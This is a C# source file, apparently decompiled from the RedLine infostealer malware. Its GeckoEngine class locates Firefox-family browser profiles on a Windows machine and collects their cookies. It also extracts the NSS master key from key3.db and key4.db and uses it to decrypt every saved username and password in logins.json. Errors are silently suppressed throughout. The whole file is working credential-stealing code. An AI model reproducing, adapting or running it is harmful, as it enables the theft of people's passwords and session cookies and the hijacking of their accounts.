using RedLine.Logic.Extensions;
using RedLine.Logic.Helpers;
using RedLine.Logic.Json;
using RedLine.Logic.SQLite;
using RedLine.Models;
using RedLine.Models.Browsers;
using RedLine.Models.Gecko;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace RedLine.Logic.Browsers.Gecko
{
  public static class GeckoEngine
  {
    public static List<Browser> ParseBrowsers()
    {
      List<Browser> browserList = new List<Browser>();
      try
      {
        List<string> stringList = new List<string>();
        stringList.AddRange((IEnumerable<string>) DecryptHelper.FindPaths(RedLine.Logic.Helpers.Constants.LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
        stringList.AddRange((IEnumerable<string>) DecryptHelper.FindPaths(RedLine.Logic.Helpers.Constants.RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
        foreach (string fileName in stringList)
        {
          string fullName = new FileInfo(fileName).Directory.FullName;
          string str = fileName.Contains(RedLine.Logic.Helpers.Constants.RoamingAppData) ? GeckoEngine.GetRoamingName(fullName) : GeckoEngine.GetLocalName(fullName);
          if (!string.IsNullOrEmpty(str))
          {
            Browser browser = new Browser() { Name = str, Profile = new DirectoryInfo(fullName).Name, Cookies = (IList<Cookie>) new List<Cookie>((IEnumerable<Cookie>) GeckoEngine.ParseCookies(fullName)).IsNull<List<Cookie>>(), Credentials = (IList<LoginPair>) new List<LoginPair>((IEnumerable<LoginPair>) GeckoEngine.GetCredentials(fullName).IsNull<List<LoginPair>>()).IsNull<List<LoginPair>>(), Autofills = (IList<Autofill>) new List<Autofill>(), CreditCards = (IList<CreditCard>) new List<CreditCard>() };
            if (browser.Cookies.Count<Cookie>((Func<Cookie, bool>) (x => x.IsNotNull<Cookie>())) > 0 || browser.Credentials.Count<LoginPair>((Func<LoginPair, bool>) (x => x.IsNotNull<LoginPair>())) > 0)
              browserList.Add(browser);
          }
        }
      }
      catch
      {
      }
      return browserList;
    }

    private static List<LoginPair> GetCredentials(string profile)
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        if (File.Exists(Path.Combine(profile, "key3.db")))
          loginPairList.AddRange((IEnumerable<LoginPair>) GeckoEngine.ParseLogins(profile, GeckoEngine.GetPrivate3Key(DecryptHelper.CreateTempCopy(Path.Combine(profile, "key3.db")))));
        if (File.Exists(Path.Combine(profile, "key4.db")))
          loginPairList.AddRange((IEnumerable<LoginPair>) GeckoEngine.ParseLogins(profile, GeckoEngine.GetPrivate4Key(DecryptHelper.CreateTempCopy(Path.Combine(profile, "key4.db")))));
      }
      catch
      {
      }
      return loginPairList;
    }

    private static List<Cookie> ParseCookies(string profile)
    {
      List<Cookie> cookieList = new List<Cookie>();
      try
      {
        string str = Path.Combine(profile, "cookies.sqlite");
        if (!File.Exists(str))
          return cookieList;
        SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(str));
        sqlConnection.ReadTable("moz_cookies");
        for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
        {
          Cookie cookie = (Cookie) null;
          try
          {
            cookie = new Cookie()
            {
              Host = sqlConnection.ParseValue(rowIndex, "host").Trim(),
              Http = sqlConnection.ParseValue(rowIndex, "isSecure") == "1",
              Path = sqlConnection.ParseValue(rowIndex, "path").Trim(),
              Secure = sqlConnection.ParseValue(rowIndex, "isSecure") == "1",
              Expires = sqlConnection.ParseValue(rowIndex, "expiry").Trim(),
              Name = sqlConnection.ParseValue(rowIndex, "name").Trim(),
              Value = sqlConnection.ParseValue(rowIndex, "value")
            };
          }
          catch
          {
          }
          if (cookie != null)
            cookieList.Add(cookie);
        }
      }
      catch
      {
      }
      return cookieList;
    }

    private static List<LoginPair> ParseLogins(string profile, byte[] privateKey)
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        string tempCopy = DecryptHelper.CreateTempCopy(Path.Combine(profile, "logins.json"));
        if (!File.Exists(tempCopy))
          return loginPairList;
        foreach (JsonValue jsonValue in (IEnumerable) File.ReadAllText(tempCopy).FromJSON()["logins"])
        {
          Asn1Object asn1Object1 = Asn1Factory.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
          Asn1Object asn1Object2 = Asn1Factory.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
          string str1 = Regex.Replace(TripleDESHelper.Decrypt(privateKey, asn1Object1.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object1.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
          string str2 = Regex.Replace(TripleDESHelper.Decrypt(privateKey, asn1Object2.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
          LoginPair loginPair = new LoginPair() { Host = string.IsNullOrEmpty(jsonValue["hostname"].ToString(false)) ? "UNKNOWN" : jsonValue["hostname"].ToString(false), Login = string.IsNullOrEmpty(str1) ? "UNKNOWN" : str1, Password = string.IsNullOrEmpty(str2) ? "UNKNOWN" : str2 };
          if (loginPair.Login != "UNKNOWN" && loginPair.Password != "UNKNOWN" && loginPair.Host != "UNKNOWN")
            loginPairList.Add(loginPair);
        }
      }
      catch
      {
      }
      return loginPairList;
    }

    private static byte[] GetPrivate4Key(string file)
    {
      byte[] numArray = new byte[24];
      try
      {
        if (!File.Exists(file))
          return numArray;
        SqlConnection sqlConnection = new SqlConnection(file);
        sqlConnection.ReadTable("metaData");
        string s = sqlConnection.ParseValue(0, "item1");
        Asn1Object asn1Object1 = Asn1Factory.Create(Encoding.Default.GetBytes(sqlConnection.ParseValue(0, "item2)")));
        byte[] objectData1 = asn1Object1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData2 = asn1Object1.Objects[0].Objects[1].ObjectData;
        GeckoPasswordBasedEncryption passwordBasedEncryption1 = new GeckoPasswordBasedEncryption(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData1);
        passwordBasedEncryption1.Init();
        TripleDESHelper.Decrypt(passwordBasedEncryption1.DataKey, passwordBasedEncryption1.DataIV, objectData2, PaddingMode.None);
        sqlConnection.ReadTable("nssPrivate");
        int rowLength = sqlConnection.RowLength;
        string empty = string.Empty;
        for (int rowIndex = 0; rowIndex < rowLength; ++rowIndex)
        {
          if (sqlConnection.ParseValue(rowIndex, "a102") == Encoding.Default.GetString(RedLine.Logic.Helpers.Constants.Key4MagicNumber))
          {
            empty = sqlConnection.ParseValue(rowIndex, "a11");
            break;
          }
        }
        Asn1Object asn1Object2 = Asn1Factory.Create(Encoding.Default.GetBytes(empty));
        byte[] objectData3 = asn1Object2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData4 = asn1Object2.Objects[0].Objects[1].ObjectData;
        GeckoPasswordBasedEncryption passwordBasedEncryption2 = new GeckoPasswordBasedEncryption(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData3);
        passwordBasedEncryption2.Init();
        numArray = Encoding.Default.GetBytes(TripleDESHelper.Decrypt(passwordBasedEncryption2.DataKey, passwordBasedEncryption2.DataIV, objectData4, PaddingMode.PKCS7));
      }
      catch
      {
      }
      return numArray;
    }

    private static byte[] GetPrivate3Key(string file)
    {
      byte[] numArray = new byte[24];
      try
      {
        if (!File.Exists(file))
          return numArray;
        DataTable dataTable = new DataTable();
        GeckoDatabase berkeleyDB = new GeckoDatabase(file);
        PasswordCheck passwordCheck = new PasswordCheck(GeckoEngine.ParseDb(berkeleyDB, (Func<string, bool>) (x => x.Equals("password-check"))));
        string db = GeckoEngine.ParseDb(berkeleyDB, (Func<string, bool>) (x => x.Equals("global-salt")));
        GeckoPasswordBasedEncryption passwordBasedEncryption1 = new GeckoPasswordBasedEncryption(DecryptHelper.ConvertHexStringToByteArray(db), Encoding.Default.GetBytes(string.Empty), DecryptHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
        passwordBasedEncryption1.Init();
        TripleDESHelper.Decrypt(passwordBasedEncryption1.DataKey, passwordBasedEncryption1.DataIV, DecryptHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck), PaddingMode.None);
        Asn1Object asn1Object1 = Asn1Factory.Create(DecryptHelper.ConvertHexStringToByteArray(GeckoEngine.ParseDb(berkeleyDB, (Func<string, bool>) (x =>
        {
          if (!x.Equals("password-check") && !x.Equals("Version"))
            return !x.Equals("global-salt");
          return false;
        }))));
        GeckoPasswordBasedEncryption passwordBasedEncryption2 = new GeckoPasswordBasedEncryption(DecryptHelper.ConvertHexStringToByteArray(db), Encoding.Default.GetBytes(string.Empty), asn1Object1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
        passwordBasedEncryption2.Init();
        Asn1Object asn1Object2 = Asn1Factory.Create(Asn1Factory.Create(Encoding.Default.GetBytes(TripleDESHelper.Decrypt(passwordBasedEncryption2.DataKey, passwordBasedEncryption2.DataIV, asn1Object1.Objects[0].Objects[1].ObjectData, PaddingMode.None))).Objects[0].Objects[2].ObjectData);
        if (asn1Object2.Objects[0].Objects[3].ObjectData.Length > 24)
          Array.Copy((Array) asn1Object2.Objects[0].Objects[3].ObjectData, asn1Object2.Objects[0].Objects[3].ObjectData.Length - 24, (Array) numArray, 0, 24);
        else
          numArray = asn1Object2.Objects[0].Objects[3].ObjectData;
      }
      catch
      {
      }
      return numArray;
    }

    private static string ParseDb(GeckoDatabase berkeleyDB, Func<string, bool> predicate)
    {
      string empty = string.Empty;
      try
      {
        foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
        {
          if (predicate(key.Key))
            empty = key.Value;
        }
      }
      catch
      {
      }
      return empty.Replace("-", string.Empty);
    }

    private static string GetRoamingName(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        string[] strArray = profilesDirectory.Split(new string[1]{ "AppData\\Roaming\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == "Profiles") ? strArray[0] : strArray[1];
      }
      catch
      {
      }
      return str.Replace(" ", string.Empty);
    }

    private static string GetLocalName(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        string[] strArray = profilesDirectory.Split(new string[1]{ "AppData\\Local\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == "Profiles") ? strArray[0] : strArray[1];
      }
      catch
      {
      }
      return str.Replace(" ", string.Empty);
    }
  }
}
